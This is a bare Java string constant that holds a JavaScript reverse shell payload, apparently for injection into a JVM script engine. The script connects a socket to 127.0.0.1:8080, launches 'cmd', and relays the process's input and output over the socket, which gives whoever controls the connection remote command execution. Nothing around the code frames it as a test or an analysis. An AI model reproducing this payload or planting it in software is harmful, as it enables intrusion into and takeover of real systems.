String jsPayload = "var host = \"127.0.0.1\"; " +
    "var port = 8080; " +
    "var cmd = \"cmd\"; " +
    "var s = new java.net.Socket(host, port); " +
    "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); " +
    "var pi = p.getInputStream(); " +
    "var pe = p.getErrorStream(); " +
    "var si = s.getInputStream(); " +
    "var po = p.getOutputStream(); " +
    "var so = s.getOutputStream(); " +
    "java.lang.System.out.println(\"Connected to \" + host + \":\" + port); " +
    "var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024); " +
    "while (!s.isClosed()) { " +
    "    try { " +
    "        while (pi.available() > 0) { " +
    "            var len = pi.read(buffer); " +
    "            if (len > 0) so.write(buffer, 0, len); " +
    "        } " +
    "        while (pe.available() > 0) { " +
    "            var len = pe.read(buffer); " +
    "            if (len > 0) so.write(buffer, 0, len); " +
    "        } " +
    "        while (si.available() > 0) { " +
    "            var len = si.read(buffer); " +
    "            if (len > 0) po.write(buffer, 0, len); " +
    "        } " +
    "        so.flush(); " +
    "        po.flush(); " +
    "        java.lang.Thread.sleep(50); " +
    "        p.exitValue(); " +
    "        break; " +
    "    } catch (e) { " +
    "    } " +
    "} " +
    "p.destroy(); " +
    "s.close();";
